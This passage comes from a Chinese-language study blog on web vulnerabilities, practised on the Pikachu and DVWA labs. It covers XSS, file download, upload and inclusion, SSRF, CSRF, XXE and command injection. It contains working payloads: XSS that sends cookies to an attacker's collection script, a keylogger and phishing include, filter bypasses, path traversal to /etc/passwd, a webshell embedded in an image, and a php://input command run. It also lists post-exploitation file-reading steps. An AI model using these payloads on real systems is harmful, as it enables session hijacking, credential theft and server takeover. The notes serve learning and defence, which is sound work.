(&#39;REMOTE_ADDR&#39;);$cookie=$_GET[&#39;cookie&#39;];$referer=$_SERVER[&#39;HTTP_REFERER&#39;];$useragent=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values(&#39;$time&#39;,&#39;$ipaddress&#39;,&#39;$cookie&#39;,&#39;$referer&#39;,&#39;$useragent&#39;)&quot;;$result=mysqli_query($link, $query);}header(&quot;Location:http://192.168.0.45:82/pikachu/index.php&quot;);//重定向到一个可信的网站?&gt;</code></pre><p>Xss安装后台，在路径D:\phpStudy\PHPTutorial\WWW\pikachu\pkxss\xcookie\cookie.php文件中将header参数后面的ip地址修改为被重定向的ip地址+端口号（pikachu平台首页）。在前端将输入框的长度更改一下。将xss后台登录， 在xss（get）模式下，输入payload：<code>&lt;script&gt;document.location = &#39;http://**被入侵的ip+端口号**/Pikachu-master/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code> 提交，提交后后台就会获取到cookie信息，同时攻击者可以根据get方式的url来伪造网址，进而客户端访问后，攻击者的后台就会获取到用户cookie。<br>伪造url：<a href="http://192.168.0.45:82/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</a> ，这个地址明显式攻击地址，攻击者可以根据工具伪造成其他的地址。 访问之后，会重定向到pikachu首页，为了让用户没有察觉到被攻击。重定向地址在cookie.php文件中的header参数中。<br><strong>post方式</strong><br>该方式提交并不会出现在地址栏中，因为这是使用post方式发送的。<br>文件D:\phpStudy\PHPTutorial\WWW\pikachu\pkxss\xcookie\post.html<br>原理：当用户登录后，地址栏并不会出现url地址改变，所以使用post.html让他在文件中提交到xss后台，因为是post提交，所以需要在输入框内输入用户名和密码。，而不是通过get的url地址，只不过是将script代码从url中挪到html文件中，这样，只要把文件发给用户，用户点击后就会自动提交，而url是通过链接提交的。并且当第一次登录该页面时因为没有登录，所以post.html获取不到cookie，只有登录过之后，有cookie记录了之后，再访问post.html的时候才会获取cookie。<br>post.html中的代码<br>      &gt; <html></html></p><blockquote><pre><code>&lt;head&gt;&lt;script&gt;window.onload = function() {  document.getElementById(&quot;postsubmit&quot;).click();}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://192.168.0.45:82/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;//被攻击的页面&lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value=&quot;&lt;script&gt;**document.location = &#39;http://192.168.0.45:82/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;//黑客搭建的xss后台，这行代码就相当于我们在url中插入的url地址，只不过这个不需要url，只需要用户点击post.html这个文件就会自动提交**&lt;/script&gt;&quot; /&gt;&lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;  </code></pre></blockquote><p>总结上面出现的所有的错误都是由于地址书写出现错误，要正确配置ip地址和文件路径地址。<br><strong>存储型</strong><br>即可以插入数据库的，有记录日志的。设置payload：<script src="http://192.168.0.45:82/pikachu/pkxss/xfish/fish.php"></script>，就是攻击者提供一个链接，客户访问该链接，并且输入账号和密码，那么攻击者就会从后台拿到该信息<br>需要将fish.php文件中的ip地址修改，<br>出现错误原因；在fish.php中，header这个参数用，用户名和密码需要用单引号括起来，但是视频中的文件没有单引号<br><strong>键盘记录</strong><br>跨域：例 http:// www.   oldboyedu.com:80/news/index.php<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;协议  &nbsp;&nbsp;  子域名    主域名 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;      端口  &nbsp;&nbsp;  资源地址<br>当协议，域名，或者端口中任意一个不相同是，则称为不同域，即在一个网页中<strong>通过脚本</strong>访问了另一个域，即使用js代码，则称为跨域。这在浏览器中是不允许的。<br>同源策略：即禁止网站实行跨域操作即禁止js代码访问其他跨域网站，例如一个恶意网站引用了银行网站，此时使用js代码可能就会获取银行账户和密码。<br>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的<br>    &lt;script src=”…” //加载本地js执行<br>    &lt;img src=”…” //图片<br>    &lt;link href=”…” //css<br>    &lt;iframe src=”…” //任意资源<br> 同源策略修改，D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php，将Access-Control-Allow-Origin设置为<em>,即允许所有人访问，这是不安全的，一般是</em>.oldboy.com，即在同域下进行访问。<br>注意：需要将上面目录下的rk.js文件中的ajax.open中的ip参数改为需要访问的ip和端口<br>当使用payload<a href="http://192.168.0.45:82/pikachu/pkxss/rkeypress/rk.js后，在输入框中输入任何键，都会被记录在xss后台中。" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/pkxss/rkeypress/rk.js后，在输入框中输入任何键，都会被记录在xss后台中。</a><br><strong>xss盲打</strong><br>就是在不知道后台存不存在xss漏洞的情况下，在前台留言框等输入xss代码，一般为js代码，当后台管理员登录后，因为需要查看后台留言，所以此时就会执行js代码，进而被攻击，万能代码：<code>&#39;&quot;&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code>，输入网址<code>http://ip+端口/pikachu/vul/xss/xssblind/admin_login.php</code>进行后台登录<br><strong>xss绕过</strong><br>因为后台的处理代码有可能对js代码进行处理，方式被被执行脚本，所以通常如果想用xss进行攻击，我们可以采用xss绕过的方式，具体是使用一些更改代码的方式<br>（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。例前端可能有输入字符数目的限制，我们需要在前端代码中修改一下字符长度。或者使用抓包方式，抓到包之后将过滤代码删除掉，写入攻击代码即可<br>（2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。即过滤是可能过滤的只是小写script，但是前端是不区分大小写的，所以我们使用大小写也可能绕过过滤。<br> 例：</p><pre><code>&gt; &lt;sCRipT&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/sCrIPt </code></pre><p>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。，即后台将<code>&lt;script</code>这个代码进行了过滤，但是我们在前面使用&lt;sc 后面使用 ript，当过滤掉&lt;script之后，前后面就又拼接成了script。这也是一种过滤。<br>例：</p><pre><code>&gt; &lt;sc&lt;s+c+r+i+p+t&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;s+c+r+i+p+t&gt;ipt&gt;&lt;font color=red&gt;(为了防止过滤，我在script字符之间加上了+号，使用时将+去掉即可)&lt;/font </code></pre><p>4）使用注释来干扰后台对输入内容的识别。即注释里面的内容不执行，但是为了拼接就写上即可</p><pre><code>&gt; 例：&lt;sc&lt;!-**+**-test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!-**+**-tshauie--&gt;ipt&gt;（使用时删除加号）  </code></pre><p>5）编码<br> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）  </p><p><strong>XSS绕过之htmlspecialchars()函数,xss防御</strong><br>htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。<br>预定义的字符是：<br> &amp; (和号)转换为 &amp;amp<br> “ (双引号)成为 &amp;quot<br> ’ (单引号)成为&amp;#039<br> &lt; (小于)成为 &amp;lt<br> ‘&gt;(大于)成为 &amp;gt  </p><p>该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)<br>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。<strong>但是这个函数默认配置不会将单引号和双引号过滤</strong>，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号<br>可用的quotestyle类型：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号<br>如果没有设置单引号过滤，但是设置了大于小于号过滤，我们可使用以下语句绕过：  q’ onclick=’alert(111)’</p><p><strong>XSS防御的总体思路是</strong>：对输入进行过滤，对输出进行编码<br>过滤：根据业务需求进行过滤，比如输出点要求输入手机号，则只允许输入手机号格式的数字。<br>转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面的进行JS转义()，但是如果使用htmlsecialchars函数进行实体转义，容易发生转义后字符无法识别的问题，这是杀敌一千自损八百的做法，所以通常使用转义字符进行处理  </p><p>xss之href输出绕过：javascript:alert(1111) 直接代入a标签herf里面一样可以绕过htmlspecialchars，即没有使用尖角字符也可以绕过</p><p>xss之js输出绕过：</p><blockquote><pre><code>$ms=&#39;11&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;;这里使用了js绕过代码1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></pre></blockquote><h2 id="文件漏洞"><a href="#文件漏洞" class="headerlink" title="文件漏洞"></a>文件漏洞</h2><h3 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h3><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接<strong>拼进</strong>下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！<br>即原本的文件下载路径为<a href="http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=sks.png" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=sks.png</a><br>但是攻击者手动拼接路径：<a href="http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=../../../index.php则会将其他目录的文件下载下来。如果下载的是包含数据库账号和密码的文件则最终会泄露。" target="_blank" rel="noopener">http://192.168.0.45:82/pikachu/vul/unsafedownload/execdownload.php?filename=../../../index.php则会将其他目录的文件下载下来。如果下载的是包含数据库账号和密码的文件则最终会泄露。</a><br>防御：就是限制用户只能下载本目录的文件，不能下载其他目录的文件。</p><p><strong>当遇到一个任意文件下载时，我们的一般利用思路:</strong></p><p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p><p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p><p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>      尝试读取/root/.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用../来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。  </p><p>如果我们遇到的是java+oracle环境<br> 可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p><p>如果具有root权限<br>  在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。<br>locate 读取方法: locate mlocate.db admin    //可以将mlocate.db中包含admin文件名的内容全部输出来<br><strong>漏洞修复</strong><br>（1）过滤”.”，使用户在url中不能回溯上级目录</p><p>（2）正则严格判断用户输入参数的格式</p><p>（3）php.ini配置open_basedir限定文件访问范围  </p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>原因：当网站上传文件的接口没有对文件进行过滤，导致攻击者上传一些恶意文件，控制后台的操作。注意测试的时候使用火狐浏览器，google浏览器完成不了。<br><strong>1.攻击者在客户端绕过javascript检测。</strong><br>开发人员在写代码时，只在前端页面使用函数判断该文件的类型是否符合要求上传的类型。所以攻击者只需要在浏览器中打开前端代码，找到该函数，然后将其删掉即可绕过javascript检测，上传恶意文件。<br>前端javascript检测代码</p><blockquote><pre><code>function checkFileExt(filename){var flag = false; //状态var arr = [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;];//取出上传文件的扩展名var index = filename.lastIndexOf(&quot;.&quot;);var ext = filename.substr(index+1);//比较for(var i=0;i&lt;arr.length;i++){if(ext == arr[i]){flag = true; //一旦找到合适的，立即退出循环break;}}//条件判断if(!flag){alert(&quot;上传的文件不符合要求，请重新选择！&quot;);location.reload(true);}}</code></pre></blockquote><p>然后在前端我们找到对应的checkFileExt（）函数，然后将其删掉就可以上传非指定的文件了。<br>第二种方式，是使用抓包，将恶意文件的后缀名改为jpg，然后抓到包之后，再将文件后缀名改回去，这样也可以上传恶意文件。<br><strong>2.服务端验证绕过(MIME 类型检测)</strong><br>   MIME(Multipurpose Internet Mail Extensions)是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。<br>通过使用 PHP 的<strong>全局数组 $_FILES</strong>，你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：<br>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码<br><strong>分析代码逻辑</strong>：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查  。<br>分析upload_sick函数存在漏洞的的<strong>原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。这样我们使用工具抓包之后，将http头部的contnet-type的类型改为其他类型就可以进行上传恶意文件了</strong></p><p><strong>三、代码注入绕过–getimagesize()</strong><br>  getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。。如果后台使用的是这种验证方式，他不是通过文件后缀名来判断是不是指定的文件，而是通过文件的二进制代码的前16位来判断，所以即使能够选择恶意文件但是还是上传不上去，所以我们使用其他的方式绕过，即将一句话木马或者其他脚本文件写入指定的文件，例如，将一句话木马写入图片中我们使用命令copy /b sks.png+muma.php muma.png，将php代码插入图片中然后上传就可以了。最后需要配合其他漏洞来执行一句话木马，否则即使上传了恶意代码也是不能够执行的。<br>后台函数语法格式：<br>    <code>array getimagesize ( string $filename [, array &amp;$imageinfo ] )</code><br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。  </p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>因为php语言的文件包含功能太过强大，所以通常发生在php语言中<br>php语言中四个文件包含函数 ，  </p><ol><li>include（）  </li><li>include_once()  </li><li>require()  </li><li>require_once()<br>包含类型分为本地包含和远程包含。<br>如果希望网站具有本地包含功能，则需将php.ini文件中的allow_url_include该为on<br>如果希望网站具有远程包含功能，需要将magic_quotes_gbc改为on<br>例子：首先找一个带一句话木马的图片到发布的Web站点路径下面，其次通过存在包含漏洞的页面来包含刚上传带一句话木马的图片,最后一定要注意相对路径。当在网站上浏览时，就是执行文件包含(例include(“../../a.jpg”))这串代码，然后加载图片，最终执行一句话木马。<br>远程包含就是访问的url不再是本地路径，而是一个链接，这个可能是其他网站上面一个文件。  </li></ol><p><strong>str_replace()</strong><br>如果后台php代码使用了str_replace()函数，那么我们使用另一种方法绕过。<br>首先查看源码，打开dvwa,将安全等级调为中等，打开file inclusion的源码查看  </p><blockquote><pre><code>&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); ?&gt;</code></pre></blockquote><p>发现如果使用../或者http等本地包含或者远程包含，该函数会使用空字符串替换掉这两种字符，以起到安全防范的作用。那么我们应该怎样突破这种防范呢？我们构造可以构造‘…/./’这个路径替换../因为replace函数将../替换为空，所以剩下了最后又剩下了../同样可以查询到上一级路径。<br>同样远程包含为<a href="http://ip+端口/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt，**使用htthttp://p替换http://即可" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt，**使用htthttp://p替换http://即可</a>**  </p><p><strong>fnmatch函数</strong><br>将dvwa的等级调为高级，查看文件包含的源代码。</p><pre><code>&gt; &lt;?php &gt; &gt; // The page we wish to display &gt; $file = $_GET[ &#39;page&#39; ]; &gt; &gt; // Input validation &gt; if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { &gt; // This isn&#39;t the page we want! &gt; echo &quot;ERROR: File not found!&quot;; &gt; exit; &gt; } </code></pre><p>发现源码的意思是如果文件路径不是以file开头的，同时不是include.php文件，那么就报错。如果文件名符合其中一个条件既可以。此处我们构造page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）所以这种方式我们也是可以绕过的。<br>最后我们在使用impossible即无漏洞的安全界别</p><pre><code>&gt; &lt;?php &gt; &gt; // The page we wish to display &gt; $file = $_GET[ &#39;page&#39; ]; &gt; &gt; // Only allow include.php or file{1..3}.php &gt; if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { &gt; // This isn&#39;t the page we want! &gt; echo &quot;ERROR: File not found!&quot;; &gt; exit; &gt; } </code></pre><p>这个源码表示文件只能包含include.php,file1.php,file2.php,file3.php，这四种文件，如果是其他文件则返回错误，相当于设置了白名单。</p><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。，即入侵者通过构造url访问日志文件。<br>Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中<br>我们访问文件上传的url，在url后面拼接../../../../Apache-20\logs\access.log，则页面会访问日志文件，我们可以获取信息。<br>例如:<a href="http://ip+端口/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log</a></p><h3 id="php包含读文件"><a href="#php包含读文件" class="headerlink" title="php包含读文件"></a>php包含读文件</h3><p>即我们使用burpsuit抓包之后，在访问页面上拼接<a href="http://IP+端口号/dvwa/vulnerabilities/fi/?page=**php://filter/read=convert.base64-encode/resource=文件名**则就会将文件内容读出来了。" target="_blank" rel="noopener">http://IP+端口号/dvwa/vulnerabilities/fi/?page=**php://filter/read=convert.base64-encode/resource=文件名**则就会将文件内容读出来了。</a>  </p><h3 id="php包含写文件"><a href="#php包含写文件" class="headerlink" title="php包含写文件"></a>php包含写文件</h3><p>在后面拼接<strong>php://input</strong><br>例如<a href="http://ip+端口/dvwa/vulnerabilities/fi/?page=php://input，抓包之后，写入内容并且提交post数据为" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/?page=php://input，抓包之后，写入内容并且提交post数据为</a>:<?php system('net user');?>，则在网页上就会获得执行的命令结果。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）<br><strong>SSRF 形成的原因</strong>  大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，即服务器之间互相获取数据。<br>SSRF常出现的位置：<br>1）通过url地址分享网页内容<br>2）转码服务<br>3）在线翻译<br>4）通过url的图片加载与下载<br>5）图片，文章收藏功能<br>6）未公开的api实现，即其他的url调用<br>7）从url关键字中寻找，share，wap，url，link，src，source，target，u，3g，display，sourceurl，domain<br><strong>绕过</strong><br>1）例如有些开发者使用正则表达式过滤掉ip地址，我们可以将ip地址使用八进制或者十进制等写法进行更改<br>2）通过不正确的正则表达式解析：将其他的url认为是自己内网的ip<br><strong>存在漏洞的后端代码</strong><br>1.file_get_contents函数  </p><pre><code>`&lt;?phpif (isset($_POST[&#39;url&#39;])) { $content = file_get_contents($_POST[&#39;url&#39;]); $filename =&#39;./images/&#39;.rand().&#39;;img1.jpg&#39;; file_put_contents($filename, $content); echo $_POST[&#39;url&#39;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; } echo $img; ?&gt;`</code></pre><p>这段函数从用户获取url图片，然后随机文件名保存在硬盘上<br>2.php fsockopen()<br>    <code>&lt;?php     function GetFile($host,$port,$link)     {     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);     if (!$fp) {     echo &quot;$errstr (error number $errno) \n&quot;;     } else {     $out = &quot;GET $link HTTP/1.1\r\n&quot;;     $out .= &quot;Host: $host\r\n&quot;;     $out .= &quot;Connection: Close\r\n\r\n&quot;;     $out .= &quot;\r\n&quot;;     fwrite($fp, $out);     $contents=&#39;&#39;;     while (!feof($fp)) {     $contents.= fgets($fp, 1024);     }     fclose($fp);     return $contents;     }     }    ?&gt;</code><br>这段代码使用函数获取指定的url数据<br>3.curl_exec()  </p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;])){$link = $_POST[&#39;url&#39;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;file_put_contents($filename, $result); echo $result;}?&gt;</code></pre><p>使用curl_exec()获取url地址。 </p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>使用远程文件包含进行端口扫描  </p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><strong>全拼</strong>：Cross Site Request Forgery 跨站点伪造请求<br><strong>原理：</strong>以受害者名义伪造请求，发送给攻击站点，也就是攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是合法的，但是对攻击者是有益的。CSRF是建立在session或者cookie上面的攻击，例如当执行银行转账的时候，好友发送来了一个攻击连接，这个连接与转账的页面相同，但是是精心构造的转账业务代码，此时该业务代码会继续利用cookie或者session中的身份信息进行转账操作，但是代码中的转账用户或者转账金额可能已经变化，所以最终会将钱转给攻击者。而这一切对于服务器来说都是合法的。并且这个过程是用户处在与银行网站的会话过程中，如果退出浏览器，则cookie也会消失，所以此时即使点击连接也是没有用的。<br><strong>CSRF分类</strong> 1.站外，例如一些评论区或者留言板，当被攻击者在会话状态下点击该连接就会执行攻击代码。<br>2.这种是由于程序员滥用request接受表单的方式引发的，因为request既可以接受post方式也可以接受get提交方式，这样由于在会话状态下访问了攻击者构造的get方式提交的代码，就可以更改用户信息，或者添加用户等操作。<br><strong>实战</strong><br><strong>CSRF防御</strong><br>1）验证HTTP Refer字段，防止访问站外链接。http头中有个refer字段它记录的请求的来源地址，如果refer指向的不是内部网站，而是攻击者指向的网站，则可能被检测出含有crsf攻击。<br>2）在请求中添加token并验证：因为攻击者会使用用户的cookie身份信息，因此在请求中放入攻击者不能伪造的信息，并且该信息不存在与cookie中，因此程序员在http请求提交时添加一个token，如果验证token不正确或者没有，那么说明不是用户提交的信息而被过滤掉。<br>3）在http中自定义属性：也是使用了token，但是这个token是放在http头的属性里面<br>4）在asp网站中不要使用request方式来提交，同时不要使用get方式执行持久性操作。<br>5）使用验证码或者密码确认方式，这种方式用户体验差。</p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xml是一种允许用户对标记语言进行自定义的源语言。包括文档声明，DTD(document type defination)，文档元素。xxe全拼为xml外部引用漏洞。<br>xxe学习网址：<a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a><br>xml文档格式，实体分为引用实体和参数实体  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding = &quot;gb1312&quot; encoding=&quot;UTF-8&quot;?&gt;//xml声明xml版本，编码  &lt;!DOCTYPE root system &quot;http://www.xxx.com/file&quot;[//定义DTD,root为根节点名称，system为要使用的DTD本地文件路径，如果是公共文件，则将system换为public，路径改为公共路径即可。&lt;!ELEMENT root(a,b,c,d)&gt;//声明xml中所有包含的节点名称，other代表其他元素名称的总称&lt;!ELEMENT to(#PCDATA)&gt;//定义to元素为pcdata类型&lt;!ELEMENT generalentity &quot;web.txt&quot;&gt;//引用实体，名称generalentity，引用web.txt中的内容，引用方式：&amp;实体名称,它的特点是在dtd中定义，在xml文档中使用，可以引用内部或者外部实体&lt;!ELEMENT % extendentity SYSTEM &quot;www.xxx.com/file&quot;&gt;//定义参数实体，引用外部文件，引用方式：%参数名称，它的特点是在dtd中定义在dtd中使用，可以引用内部或者外部实体(注意在%和实体名称之间有空格)]&gt;上面是定义的DTD，也就是限制了xml代码必须像下面这样写xml文档  &lt;a&gt;我&lt;/a&gt;&lt;b&gt;是&lt;/b&gt;&lt;c&gt;&amp;generalentity&lt;/c&gt;</code></pre><p>因为引用实体和参数实体都可以引用外部实体，所以说如果将外部实体的路径改变为攻击者指定了payload文件，那么就说明出现了xxe漏洞。</p><h2 id="远程命令执行与反序列化"><a href="#远程命令执行与反序列化" class="headerlink" title="远程命令执行与反序列化"></a>远程命令执行与反序列化</h2><p><strong>定义：</strong>远程命令/代码执行，RCE(remote command/code execute)<br><strong>原因</strong>：因为系统需要提供远程命令操作，例如路由器，防火墙等。<br>PHP命令注入攻击：原因是程序员在使用一些提供给用户输入的命令执行函数时，没有对用户输入进行过滤。php中共有五个函数，1.system函数：string system(String command,int &amp;return_var)；执行命令函数<br>    <?    $dir=$_GET("dir");    if(isset("$dir")){    echo"<pre>";    system"ls -al".$dir;    echo "";    }    ?>程序员想通过cmd命令浏览$dir,但是攻击者通过在路径上面拼接file.php？dir=|cat /etc/passwd,这样当程序执行时，$dir就会变成攻击者设置的攻击命令，进而完成攻击。<br>2.exec函数：String exec(String command,array&amp;output,int &amp;return_var);执行应用程序函数<br>代码与上面同理<br>3.passthru:void passthru(String command,int &amp;return_var);用来执行UNIX系统命令。<br>代码同上<br>4.shell_exec函数：String shell_exec(String command);执行shell命令并返回字符串。<br>代码同上<br>5.’’:这个运算符与shell_exec具有相同的作用。<br>    <?    $cmd=$_GET("cmd");    $output='$cmd';//这里与执行shell_exec是一样的。    echo"<pre>";    echo $output;    echo "";    ?></p><h3 id="eval注入攻击"><a href="#eval注入攻击" class="headerlink" title="eval注入攻击"></a>eval注入攻击</h3><p>eval函数会将字符串转换为php代码来执行，而上面的函数是将代码转换为cmd命令来执行。例如<br>    <?    $cmd=$_GET("cmd");    eval($cmd);    ?>当在地址栏提交<a href="http://127.0.0.1/index.php?cmd=phpinfo();后就会出现执行phpinfo（）函数的结果。" target="_blank" rel="noopener">http://127.0.0.1/index.php?cmd=phpinfo();后就会出现执行phpinfo（）函数的结果。</a></p><h3 id="PHP木马后门常用命令"><a href="#PHP木马后门常用命令" class="headerlink" 